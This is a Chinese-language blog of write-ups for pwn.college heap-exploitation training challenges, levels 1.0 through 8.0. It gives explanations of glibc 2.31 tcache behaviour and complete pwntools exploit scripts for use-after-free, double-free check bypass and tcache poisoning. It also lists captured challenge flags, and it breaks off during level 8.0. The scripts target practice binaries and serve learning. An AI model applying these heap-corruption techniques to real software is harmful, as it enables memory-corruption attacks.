---
title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
published: 2025-09-08
updated: 2025-10-01
description: "Write-ups for pwn.college binary exploitation series."
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
tags: ["Pwn", "Write-ups", "Heap"]
category: "Write-ups"
draft: false
---

# 前言

悲，这篇博客最早是在 2025-01-25 开始写的，那会儿刚准备开始学堆，结果却因为各种各样的原因（主要是未来路线规划和刚接触堆面对各种陌生的新知识感觉十分害怕，也确实不懂，觉得很难），就去干别的了。没想到一直到 25 年 9 月才重新开始写这篇博客……既然如此，那就干脆把以前写的全删了，从头开始刷这章好了……

其实发现以前写的多少有点小问题，虽然现在我会的也只是比一开始的时候多了那么一丢丢，只是粗略了解了一点 glibc 堆分配机制而已。总的来说，面对这一章我本质上还是从零开始，差不多吧……

# Level 1.0

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

我就不贴反编译代码了，感觉也没啥好贴的。主要还是说说思路吧：

`read_flag` 会 malloc 330 字节空间，然后将 flag 读到 malloc 返回的地址中。

`puts` 会输出全局变量 `ptr` 中的内容，也就是说我们只要想办法让 read_flag 的 malloc 返回的地址与 ptr 保存的地址相同，就可以通过 puts 输出 flag 的内容。

因为 glibc 堆分配器会从 bins 中寻找并复用大小近似的 free chunk，所以我们可以先通过调用 malloc 分配一块 330 字节的空间，然后 free 掉。这样下次如果还 malloc 330 字节大小的空间就会复用我们第一次 malloc 330 返回的地址。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level1.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(330)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{8_UCfYUIGnvHU86NU1Qe-H6dK1o.0VM3MDL5cTNxgzW}`]

# Level 1.1

## Information

- Category: Pwn

## Description

> Exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 1.0](#level-10)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level1.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(618)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{8oPO3KqdZU5lZfzl5xftjR2IZif.0lM3MDL5cTNxgzW}`]

# Level 2.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

与 [Level 1](#level-10) 区别不大。但是在 malloc 存放 flag 的空间时使用的是 `rand() % 872 + 128`，这会生成 $[ 0+128,872+128)$ 范围内的随机数。所以我们要么预测它生成什么随机数，要么爆破它落在哪个 bin 中。

[rand](https://en.cppreference.com/w/c/numeric/random/rand) 生成的是伪随机数，可以预测。本来想直接 break PRNG 的：[上帝掷骰子？不，其实是线性同余](/posts/pwn-notes/pwn-trick-notes/#上帝掷骰子不其实是线性同余)。

但是后来发现程序在 `__libc_csu_init` 中调用了 `flag_seed`，而这个函数内部又调用了 `srand(seed)`，它的 seed 是循环异或栈上的数据得来的。虽然在每台机器上运行都会有特定的栈上的数据，但是并不是一个普适的方法，尽管我可以 debug 得到 seed，但是远程就打不通了。所以我们还是用爆破 bins 的方法好了。tcache bins 有限，这个 rand 生成的范围也不是很大，所以还是很容易爆破的。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level2.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def test_size(candidate):
    launch()
    malloc(candidate)
    free()
    read_flag()
    puts()

    response = target.recvall(timeout=0.01)
    if b"pwn.college{" in response:
        target.close()
        return True
    return False


def main():
    for bin in range(0x20, 0x410 + 1, 0x10):
        base_req = bin - 0x10
        ok = test_size(base_req)
        if ok:
            log.success(
                f"Found working requested size: {hex(base_req)} for tcache bin {hex(bin)}"
            )
            return
        log.warning("Exhausted candidates, none matched.")
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{ME7LG_Jy8T-xEw9H_njxpD2aJ4z.01M3MDL5cTNxgzW}`]

# Level 2.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag.

## Write-up

参见 [Level 2.0](#level-20)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level2.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def test_size(candidate):
    launch()
    malloc(candidate)
    free()
    read_flag()
    puts()

    response = target.recvall(timeout=0.01)
    if b"pwn.college{" in response:
        target.close()
        return True
    return False


def main():
    for bin in range(0x20, 0x410 + 1, 0x10):
        base_req = bin - 0x10
        ok = test_size(base_req)
        if ok:
            log.success(
                f"Found working requested size: {hex(base_req)} for tcache bin {hex(bin)}"
            )
            return
        log.warning("Exhausted candidates, none matched.")
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{MihEcPIR1bQBmiQGOoGELSrscgW.0FN3MDL5cTNxgzW}`]

# Level 3.0

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

这题和之前也差不多，只不过 `ptr` 变成了可以容纳 16 个指针的数组，然后 `read_flag` 会 malloc 两次，flag 被写入第二次 malloc 返回的地址中。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level3.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx))
    target.sendlineafter(b"Size: ", str(size))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 773)
    malloc(1, 773)
    free(0)
    free(1)
    read_flag()
    puts(0)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{wvvL-j9QzjeoJrOsQS4Vval7exq.0VN3MDL5cTNxgzW}`]

# Level 3.1

## Information

- Category: Pwn

## Description

> Create and exploit a use-after-free vulnerability to get the flag when multiple allocations occur.

## Write-up

参见 [Level 3.0](#level-30)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    log,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level3.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx))
    target.sendlineafter(b"Size: ", str(size))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 911)
    malloc(1, 911)
    free(0)
    free(1)
    read_flag()
    puts(0)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{wDLulwEpEQfpi78_Z4CAniTrByQ.0lN3MDL5cTNxgzW}`]

# Level 4.0

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct value to get the flag when multiple allocations occur.

## Write-up

变变变，围绕一个特定的主题，逐步递增难度，最后产生各种不同的变式，这就是我最喜欢 pwn.college 的地方，对于学习各种利用姿势来说非常友好。

这题回到了一开始的样子，`ptr` 是一个全局变量，用于保存 malloc 返回的指针。`read_flag` 延续了上题的风格，会 malloc 两次，flag 被写到第二次 malloc 返回的地址中。

此外，新增了下面这个 `scanf` 功能：

```c
      if ( strcmp(s1, "scanf") )
        break;
      v3 = malloc_usable_size(ptr);
      sprintf(s1, "%%%us", v3);
      v4 = malloc_usable_size(ptr);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, 0);
      __isoc99_scanf(s1, ptr);
      puts(byte_246E);
```

它先通过 `malloc_usable_size(ptr)` 确定 ptr 保存的地址的 data 部分大小，然后通过 `sprintf(s1, "%%%us", v3)` 动态生成格式化字符串，写入 `s1` 中。`%%%us` 会先解析出一个 `%`，然后 `%u` 被解析为一个 `unsigned int`，最后加上 `s`，也就是根据 `v4` 动态生成 `%v4s` 这样的格式化字符串。

之后才是真正的读取输入，`__isoc99_scanf(s1, ptr)` 使用 s1 中保存的动态生成的格式化字符串，读取指定大小数据到 ptr 中。

:::important
tcache / fastbin 都是单链表，只使用了 fd 指针。区别是 tcache 的 fd 指向下一个 free chunk 的 data 区域，而 fastbin 的 fd 指向的是下一个 free chunk 的 metadata 区域。
:::

上面聊完了程序的大致功能，下面说点正经的做题思路：

我们 malloc / free 操作都受限于 ptr 指针，这个指针是固定值，而我们又希望 `read_flag` 将 flag 地址保存在 ptr 指针中，怎么办？我想了很多方法，起码也得有 5 种奇怪的方案，比如先泄漏堆地址，然后改写 ptr 指针的内容为 flag 的地址……结果最后都掉进了一些奇奇怪怪的 pitfall 里 awww，这里就不展开细说了……最后在某一天清晨，当我洗漱完继续投入到这道题中时，与平日截然相反地，我拿起了纸和笔，试图重新理理思路……结果[奇迹就发生了](https://memos.cubeyond.net/memos/NmPqpLBtMjrvZmUBMcPy92)……

简单来说就是，先 malloc 一块和 flag 需要的大小相同的区域，这时候 ptr 就变成了 malloc 的返回值，然后我们 free 它，它会被丢进 tcachebin 中。这时候如果我们直接调用 read_flag 的话，它的第一个 malloc 肯定会拿到我们刚才 free 掉的那个 chunk，然后因为没有其它空闲 chunk 了，就会从 arena 中开辟一个新的 chunk 出来，这样的话 flag 的地址就永远不会和 ptr 保存的地址相同了……<s>不行！太恶劣了！我绝对不允许这种事情发生在我眼皮底下！</s>所以，问题的关键就在于我们有没有办法令 read_flag 第二次 malloc 取得的地址和第一次 malloc 取得的一样？很简单，free 两次，tcachebin 中不就有两个一样的 free chunk 了吗？但是这样会触发 double free 检测，程序直接 abort，那么问题就变成了我们应该如何绕过这个检测了。

这里我们需要研究一下 glibc-2.31 的源码（pwn.college 这一章用的都是 2.31）：[薛定谔的 free chunks: Double Free, Double Fun ?](/posts/pwn-notes/pwn-trick-notes/#薛定谔的-free-chunks-double-free-double-fun-)

由于我们有 scanf 功能，可以向 ptr 指向的地址处写入数据，也就是说我们能写入 data 区。scanf 遇到换行则认为输入结束，并将换行替换为 `\x00`。我们想让 ptr 在 tcachebin 中出现两次，就可以这么玩：`malloc -> free -> scanf -> free -> read_flag -> puts`。至于这条攻击链的具体原理就自己琢磨去吧，我这里就不再过多赘述了。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level4.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def scanf(data):
    target.sendlineafter(b": ", b"scanf")
    target.sendline(data)


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(542)
    free()
    scanf(b"A" * 8)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{oZ6_TOkCX4vXbuU0gTGgGHmYWRJ.01N3MDL5cTNxgzW}`]

# Level 4.1

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct value to get the flag when multiple allocations occur.

## Write-up

参见 [Level 4.0](#level-40)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level4.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free():
    target.sendlineafter(b": ", b"free")


def puts():
    target.sendlineafter(b": ", b"puts")


def scanf(data):
    target.sendlineafter(b": ", b"scanf")
    target.sendline(data)


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(708)
    free()
    scanf(b"A" * 8)
    free()
    read_flag()
    puts()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{MHf4zKVq2DfY5MtZr8YZABG0Z4S.0FO3MDL5cTNxgzW}`]

# Level 5.0

## Information

- Category: Pwn

## Description

> Apply the TCACHE metadata in an unintended manner to set a value.

## Write-up

这题又是 ptr 数组，`read_flag` 将 flag 读到它 malloc 返回的地址加上 16 字节偏移的位置。然后就是新增了一个 `puts_flag` 函数：

```c
    if ( strcmp(s1, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
```

它检测 read_flag 的 malloc 返回的地址处的前 8 字节是否为空，不为空则输出 flag 。

对 `mlloc_chunk` 结构体熟悉的话就知道前 8 字节是 fd 的位置。那我们现在没有任何可以向 chunk data 写入数据的方法，如何修改 fd 呢？自然是 free 啦～

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level5.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def puts_flag():
    target.sendlineafter(b": ", b"puts_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 496)
    malloc(1, 496)
    free(0)
    free(1)
    read_flag()
    free(1)
    puts_flag()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{ckg3CON3ru3-ygB82VxLMcRUuBS.0VO3MDL5cTNxgzW}`]

# Level 5.1

## Information

- Category: Pwn

## Description

> Apply the TCACHE metadata in an unintended manner to set a value.

## Write-up

参见 [Level 5.0](#level-50)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level5.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def read_flag():
    target.sendlineafter(b": ", b"read_flag")


def puts_flag():
    target.sendlineafter(b": ", b"puts_flag")


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    malloc(0, 456)
    malloc(1, 456)
    free(0)
    free(1)
    read_flag()
    free(1)
    puts_flag()
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{YWZIg8kQV_nzpSzsFagMNO6O6Qn.0FM4MDL5cTNxgzW}`]

# Level 6.0

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct to read unintended memory.

## Write-up

ptr 数组管理多个分配，`scanf` 向指定 chunk 写入 data，`send_flag` 验证输入的 secret 与随机生成的存放在 bss 中的 secret 是否相同，相同则输出 flag 。

这是生成随机 8 字节 secret 的部分：

```c
  for ( i = 0; i <= 7; ++i )
    byte_428849[i] = rand() % 26 + 97;
```

由于没开 PIE，而生成的 secret 又是保存在 bss 段，所以我们可以精准定位 secret 的地址。

`puts` 将 `ptr[idx]` 视为字符串指针，输出其保存的内容。所以我们只要想办法令 malloc 返回给 ptr[idx] 的地址为 bss 上存放 secret 的地址就可以输出 secret 了。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    p32,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level6.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret = elf.bss() + 0x18849

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret = target.recvline().strip().decode("ascii")
    send_flag(secret)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{wLCxyleFYPCBwUq2LzFkqEM8qzv.0VM4MDL5cTNxgzW}`]

# Level 6.1

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct to read unintended memory.

## Write-up

参见 [Level 6.0](#level-60)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    p32,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level6.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret = elf.bss() + 0x1B553

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret = target.recvline().strip().decode("ascii")
    send_flag(secret)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{oc9V7EmGNRr7415ZlPgXYL-qDjV.0lM4MDL5cTNxgzW}`]

# Level 7.0

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct to read unintended memory.

## Write-up

和上题一样，但是这次变成了 16 字节随机值：

```c
  for ( i = 0; i <= 15; ++i )
    byte_429532[i] = rand() % 26 + 97;
```

问题就在于，按照上个方法我们令 malloc 拿到 secret 的地址后，它会将 `e->key = NULL`，导致后 8 字节被清空。

但是也很好解决。既然我们可以泄漏出前 8 字节，那我们将偏移加 8 再来一次不就泄漏出后 8 字节了吗？

分析下面设置 seed 的流程我们知道，seed 每次运行程序都是一样的，由于上面生成随机 secret 的部分用的是伪随机数发生器，所以每次运行结果也是不变的，那就没啥好担心的了。

```c
unsigned __int64 flag_seed()
{
  unsigned int seed; // [rsp+4h] [rbp-9Ch]
  unsigned int i; // [rsp+8h] [rbp-98h]
  int fd; // [rsp+Ch] [rbp-94h]
  _QWORD buf[17]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v5; // [rsp+98h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(buf, 0, 128);
  fd = open("/flag", 0);
  if ( fd < 0 )
    __assert_fail("fd >= 0", "<stdin>", 0x20u, "flag_seed");
  if ( read(fd, buf, 0x80uLL) <= 0 )
    __assert_fail("read(fd, flag, 128) > 0", "<stdin>", 0x21u, "flag_seed");
  seed = 0;
  for ( i = 0; i <= 31; ++i )
    seed ^= *((_DWORD *)buf + (int)i);
  srand(seed);
  memset(buf, 0, 128uLL);
  return __readfsqword(0x28u) ^ v5;
}
```

反正我用的方法比较简单粗暴，不过我也想过一次性泄漏完整的 secret，那就需要伪造 chunk size，提前做点布局……实际操作起来还挺麻烦的，也就没继续深入……

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    p32,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level7.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret_p1 = elf.bss() + 0x19532
    secret_p2 = secret_p1 + 0x8

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p1))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret_p1 = target.recvline().strip().decode("ascii")
    target.success(f"Part 1: {secret_p1}")
    target.close()
    launch()

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p2))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret_p2 = target.recvline().strip().decode("ascii")
    target.success(f"Part 2: {secret_p2}")

    secret = secret_p1 + secret_p2
    send_flag(secret)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{QXpTguKBiT4StYFr24ZsUSfm3-8.01M4MDL5cTNxgzW}`]

# Level 7.1

## Information

- Category: Pwn

## Description

> Corrupt the TCACHE entry_struct to read unintended memory.

## Write-up

参见 [Level 7.0](#level-70)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    p32,
    process,
    raw_input,
    remote,
)

FILE = "/challenge/babyheap_level7.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", str(secret).encode("ascii"))


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret_p1 = elf.bss() + 0x17051
    secret_p2 = secret_p1 + 0x8

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p1))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret_p1 = target.recvline().strip().decode("ascii")
    target.success(f"Part 1: {secret_p1}")
    target.close()
    launch()

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p2))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)

    target.recvuntil(b"Data: ")
    secret_p2 = target.recvline().strip().decode("ascii")
    target.success(f"Part 2: {secret_p2}")

    secret = secret_p1 + secret_p2
    send_flag(secret)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{cy0iZfUAyZ9bbo5DL_cS-9sxRN6.0FN4MDL5cTNxgzW}`]

# Level 8.0

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to pass a validation check.

## Write-up

和上题几乎是一样的，除了这次 secret 被刻意放在了以 `\x0a` 结尾的地址处。由于它代表 LF (Line Feed)，所以我们不能直接通过 `scanf` 将它读入，最终会少写一个 `\x0a`。只要解决了这个问题，其它的问题就可以直接套用上题 exp 思路了。

感觉这题还是有一点小难的，至少对于刚开始学的我来说并不简单。当时卡了我两天，没有什么头绪，唯一想到可行的解法是 scanf overwrite fd，指向 secret 地址向后偏移 4 字节的地方，然后我们可以就可以泄漏 12/16 的 secret 了。问题是，如何得到剩下的四个字符呢？我想过伪造 chunk 什么的方法，但是都已失败告终了。最后，我还是老老实实的写了个 bruteforce 的 approach，结果预估了一下时间，爆破四个小写字母，也就是 $1/26^{4}$ 的 chance 成功，单线程都跑不满的情况下，得要 2h 45min……草啊，我本地得测试吧，3h 没了，远程再打一遍，3h 又没了。虽然这个方法可行，但是感觉也太蠢了……

后来尝试让 AI 写个多线程爆破的 approach，写的和屎一样，最后虽然写出来了，但还是有点问题，总之虽然爆破理论可行，但是因为我运气不好，就没见过它爆出来的样子……

